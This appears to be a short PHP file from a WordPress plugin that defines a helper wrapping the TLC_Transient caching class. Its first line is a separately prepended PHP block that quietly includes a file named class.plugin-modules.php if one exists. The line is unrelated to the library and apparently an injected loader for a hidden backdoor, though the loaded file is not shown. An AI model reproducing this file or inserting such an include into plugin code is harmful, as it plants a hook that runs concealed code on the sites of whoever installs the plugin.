<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// API so you don't have to use "new"
if ( !function_exists( 'tlc_transient' ) ) {
	function tlc_transient( $key ) {
		$transient = new TLC_Transient( $key );
		return $transient;
	}
}